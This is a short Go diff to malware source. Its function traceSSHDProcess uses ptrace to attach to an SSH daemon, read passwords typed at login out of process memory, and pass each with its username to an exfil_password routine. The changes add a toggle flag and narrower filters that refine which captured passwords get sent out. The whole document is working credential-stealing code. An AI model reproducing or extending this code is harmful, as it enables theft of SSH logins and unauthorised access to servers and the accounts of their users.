@@ -5,6 +5,7 @@ import (
 	"io/ioutil"
 	"regexp"
 	"runtime"
+	"strings"
 	"syscall"
 )
 
@@ -19,6 +20,7 @@ func traceSSHDProcess(pid int) {
 		syscall.PtraceDetach(pid)
 	}()
 	var wstatus syscall.WaitStatus
+	var exfiled bool
 	for {
 		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
 		if err != nil {
@@ -53,9 +55,10 @@ func traceSSHDProcess(pid int) {
 					}
 
 					var password = removeNonPrintableAscii(string(buffer))
-					if len(password) > 2 && len(password) < 250 {
+					if len(password) > 2 && len(password) < 100 && exfiled && !strings.HasPrefix(password, "fSHA256") {
 						go exfil_password(username, removeNonPrintableAscii(password))
 					}
+					exfiled = !exfiled
 				}
 			}
 		}
